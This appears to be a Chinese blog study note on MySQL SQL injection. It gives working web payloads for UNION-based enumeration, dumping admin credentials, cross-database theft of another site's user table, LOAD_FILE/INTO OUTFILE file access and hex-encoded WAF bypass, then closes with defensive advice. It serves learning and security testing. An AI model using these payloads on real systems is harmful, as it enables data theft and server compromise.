---
title: "SQL 注入实战笔记：枚举、跨库与文件读写（MySQL）"
slug: sql-injection-mysql-practice
cover: ""
date: 2026-01-08
categories:
  - Web安全
  - SQL注入
  - top10
tags:
  - SQL注入
  - MySQL
  - 注入绕过
halo:
  site: http://www.hzhsec.top
  name: afedde0c-9c7b-4591-82a8-b5220508ec91
  publish: true
---

<!--more-->






# 一、目标与概述

**目的**：通过 SQL 注入（以 MySQL 为例）获取 Web 应用可操作的数据或权限（例如：查询数据库名称、表名、字段、读写文件、横向跨库取证等）。

本笔记覆盖：

* 常见检测与信息收集（系统、用户、数据库名、版本）
* 基于 `information_schema` 的枚举方法
* 跨库查询与文件读写（受限于权限与 `secure-file-priv`）
* 绕过/编码技巧、堆叠注入、Access 特殊处理
* 常用工具与防护建议

---

# 二、注入思路（四条信息）

开始注入前通常先判断以下四类信息，以便选择后续策略：

1. **数据库版本**（`version()`）

   * MySQL 5.0 以上自带 `information_schema`，能查询库/表/列等元信息。
   * 常用判断：`version()` 或 `select version()`。

2. **数据库用户**（`user()`）

   * `root` 用户通常有更多权限（跨库/文件读写概率更高）；非 `root` 则可能受限。
   * 常用判断：`user()`。

3. **操作系统**（`@@version_compile_os`）

   * 判断大小写敏感、路径风格（Windows `C:\` vs Linux `/var/www`）等。影响文件读写路径与大小写处理。

4. **当前数据库名**（`database()`）

   * 用于定位目标数据库，配合 `information_schema` 查找表名和字段名。

> 注：若目标无明显数据回显（盲注场景），需转为布尔/时间盲注或使用 out-of-band 技术。

---

# 三、常见注入示例（回显型）

## 1. 排序/回显定位

```sql
-- 确定字段数量（order by）
... ORDER BY 6 -- 如果 6 报错说明列数小于 6

-- 使用 UNION 定位回显列
... UNION SELECT 1,2,3,4,5,6
```

## 2. 在回显位置插入查询

```sql
-- 在可回显列插入 database(), user(), version()
... UNION SELECT 1,2,3,database(),user(),6
... UNION SELECT 1,2,3,version(),@@version_compile_os,6
```

## 3. 利用 information_schema 枚举（MySQL >= 5.0）

```sql
-- 获取所有数据库名
... UNION SELECT 1,2,3,4,GROUP_CONCAT(schema_name),6 FROM information_schema.schemata

-- 获取特定数据库的表名
... UNION SELECT 1,2,3,4,GROUP_CONCAT(table_name),6 FROM information_schema.tables WHERE table_schema='demo01'

-- 获取表的字段名
... UNION SELECT 1,2,3,4,GROUP_CONCAT(column_name),6 FROM information_schema.columns WHERE table_name='admin'

-- 查询指定表的内容（限制行数）
... UNION SELECT 1,2,3,username,password,6 FROM admin LIMIT 0,1
```

> `group_concat()` 常用于将多行合并成单行输出，适用于回显列有限的场景。

---

# 四、跨库查询（PHP + MySQL 场景）

**影响条件**：取决于当前连接的 MySQL 用户权限（是否有访问其他库的权限，通常 `root` 可以）。

**示例**：通过 B 网站的注入点，查询 A 网站数据库 `zblog` 中的表 `zbp_member`。

```sql
-- 列出所有库
... UNION SELECT 1,2,3,4,GROUP_CONCAT(schema_name),6 FROM information_schema.schemata

-- 获取 zblog 库的表
... UNION SELECT 1,2,3,4,GROUP_CONCAT(table_name),6 FROM information_schema.tables WHERE table_schema='zblog'

-- 获取 zbp_member 的字段（指定库名以避免同名表干扰）
... UNION SELECT 1,2,3,4,GROUP_CONCAT(column_name),6 FROM information_schema.columns WHERE table_name='zbp_member' AND table_schema='zblog'

-- 查询 zblog 库中具体表（前提：有权限）
... UNION SELECT 1,2,3,mem_Name,mem_Password,6 FROM zblog.zbp_member
```

**结论**：

* 普通用户可能无法访问 `information_schema` 或其他库（会被拒绝或返回空）；
* `root` 或具有足够权限的用户可以跨库查询任意表。

---

# 五、文件读写（load_file / into outfile）


**影响条件**：数据库用户权限、`secure-file-priv` 配置、目标系统路径权限。

**secure_file_priv**

- secure_file_priv 的值非NULL或包含了导出的绝对路径
- secure_file_priv的值在mysql配置文件my.ini中设置，这个参数用来限制数据导入导出

Mysql>=5.5.53 默认为NULL，即默认禁止导入导出
Mysql<5.5.53 默认为空，即默认无限制

**查看secure_file_priv值的方法**

1.在my.ini配置文件里面看

2.执行sql语句

```sql
show global variables like '%secure%';
```
secure_file_priv显示NULL说明没有权限

需要在mysql目录下的my.ini修改配置文件secure_file_priv=空


常见 payload：

```sql
-- 读取目标文件（Windows 路径示例）
... UNION SELECT 1, LOAD_FILE('d:\\1.txt'),3,4,5,6

-- 写入文件到磁盘（需要 FILE 权限，并受 secure-file-priv 限制）
... UNION SELECT 1, '111',3,4,5,6 INTO OUTFILE 'd:\\2.txt'
```

**路径获取技巧**：

1. 错误信息常会泄露路径；
2. `phpinfo()` 页面可能泄露安装路径；
3. 猜测常见软件/中间件默认安装路径（如 `/var/www/`, `C:\xampp\htdocs\` 等）。

---

# 六、过滤绕过与编码技巧

## 1. 单引号过滤策略

* 如果单引号被过滤或转义：尝试使用十六进制编码、不带单引号的函数或利用注释闭合等方式。
* 常见方法：`0x...`（十六进制）、`char()`、`concat()`、`prepare/execute` 等。

## 2. 编码逃逸（示例）

* 将 SQL 语句以十六进制表示赋值给变量，再用 `prepare ... from` 与 `execute` 执行：

```sql
-- 将 select * from `1919810931114514` 用 0x 十六进制编码后执行
1'; SET @a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460; PREPARE execsql FROM @a; EXECUTE execsql; #
```

此类技巧常用来绕过 WAF 和字符串过滤。

---

# 七、Access（MDB）与堆叠注入

## Access 数据库（ASP + MDB）

* 无标准用户体系，用 `sqlmap` 字典爆破可能不稳定；
* 若知道表名/列名，直接用查询；若未知则需枚举或人工分析。

## 堆叠注入（Stacked Queries）

* MySQL 支持多语句（视驱动而定），可以使用 `;` 执行多条语句（例如：`SHOW DATABASES;`）。
* 示例用法（查看/修改表结构）：

```sql
-- 查看所有数据库
1'; SHOW DATABASES; --

-- 通过 rename / alter 做表改名或新增列（需足够权限）
1'; RENAME TABLE words TO BaiMao; ALTER TABLE words ADD id INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY; ALTER TABLE words CHANGE flag data VARCHAR(100);#
```

**注意**：堆叠注入在很多现代框架/驱动中被禁用或受限。

---

# 八、读取技巧：HANDLER（替代 SELECT）

`HANDLER` 操作常用于低级读取，示例：

```sql
1'; HANDLER FlagHere OPEN; HANDLER FlagHere READ FIRST; HANDLER FlagHere CLOSE;
1'; HANDLER FlagHere OPEN; HANDLER FlagHere READ NEXT; HANDLER FlagHere CLOSE;
```

用于逐行读取表数据（在某些环境下比 `SELECT` 更易成功）。

---

# 九、常用工具与检测流程

* **工具**：`sqlmap`、`Burp Suite`、`sqlninja`（针对 MSSQL）、`nmap --script`（发现 web 漏洞）等。
* **检测流程（典型）**：

  1. 参数注入点识别（GET/POST/头部/COOKIE）；
  2. 列数探测（`ORDER BY`）与回显列定位（`UNION SELECT`）；
  3. 信息枚举（`version()`、`user()`、`database()`）；
  4. 枚举 `information_schema`（表/列）；
  5. 数据提取（`LIMIT` 分页）或盲注（布尔/时间）;
  6. 横向扩展（跨库/文件读写）——视权限而定。

---

# 十、防护

* 使用参数化查询（Prepared Statements）或 ORM，避免字符串拼接 SQL；
* 对用户输入进行严格校验与最小化权限原则（数据库用户只赋予必要权限）；
* 关闭或限制 `LOAD_FILE` / `INTO OUTFILE` 权限；设置合理的 `secure-file-priv`；
* 数据库用户不使用 `root`：不同服务使用不同低权限用户；
* 开启 Web 应用 WAF 与异常日志告警，定期审计 SQL 日志；
* 对错误信息进行脱敏，避免泄露路径与 SQL 错误栈。

---

# 附：常见 payload 

* `ORDER BY n`：探测列数
* `UNION SELECT ...`：回显型注入
* `LOAD_FILE(...)`, `INTO OUTFILE 'path'`：文件读写
* 十六进制编码 + `PREPARE/EXECUTE`：绕过过滤
* 布尔/时间盲注：`IF(condition, SLEEP(5), NULL)`

---

# 参考

* OWASP SQL Injection Cheat Sheet
* sqlmap 文档与使用手册
* MySQL 官方文档（`information_schema`）